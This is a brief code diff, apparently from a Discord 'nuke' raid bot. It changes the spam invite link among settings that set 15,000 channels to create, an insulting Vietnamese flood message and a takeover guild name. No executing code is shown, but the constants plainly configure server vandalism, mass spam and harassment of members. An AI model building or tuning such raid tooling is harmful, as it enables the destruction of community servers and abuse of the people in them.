@@ -14,7 +14,7 @@ OWNER_IDS = [1413781843030966345, 1530189926895714355]
 RAID_NAME = " ҉N҉u҉k҉e҉ ҉D҉i҉s҉c҉o҉r҉d҉ ҉B҉y҉ ҉B҉a҉n҉a҉n҉a҉v҉u҉i҉v҉e҉ "
 CHANNEL_COUNT = 15000
 BATCH_SIZE = 80
-SPAM_LINK = "https://discord.gg/MQ9Zr4H4d"
+SPAM_LINK = "https://discord.gg/AJDpu9sqar" 
 SPAM_MESSAGE = "***SERVER CỦA CHA NÈ MẤY THẰNG NGU ĐÚ ĐỞN***"
 NEW_GUILD_NAME = "👑 𝐍𝐮𝐤𝐞 𝐁𝐲 𝐁𝐚𝐧𝐚𝐧𝐚𝐯𝐮𝐢𝐯𝐞 👑"
 
